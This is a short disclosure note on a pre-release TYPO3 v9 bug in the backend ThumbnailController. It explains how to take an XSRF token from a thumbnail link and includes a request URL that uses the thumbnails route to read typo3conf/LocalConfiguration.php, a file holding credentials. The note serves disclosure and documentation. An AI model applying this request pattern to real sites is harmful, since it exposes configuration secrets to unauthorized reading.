# Retrieving LocalConfiguration.php

This issue has been addressed already and the bug was discovered
before having been released, see https://forge.typo3.org/issues/85875
& https://review.typo3.org/#/c/57943/

Replace XSRF token for `&token=` with correct value - you need to
have a valid backend user session.

In order to retrieve XSRF token, open `Web > Page` module, select
a page that contains text with image elements. Open the shown thumbnail
image in a new tab and reuse its `&token=` value.

```
http://typo3v9-hack.ddev.local/typo3/index.php
?route=%2Fthumbnails
&token=36040ecd8c603c15d02e00ab4cb3426f4be8827a
&fileIdentifier=typo3conf/LocalConfiguration.php
&processingInstructions%5Bwidth%5D=64
&processingInstructions%5Bheight%5D=64c
&processingInstructions%5Bcrop%5D=
```

## Inspections

`\TYPO3\CMS\Backend\Controller\File\ThumbnailController`

## Security Vulnerability

Never was an issue for any released versions because it has been
discovered prior to being released.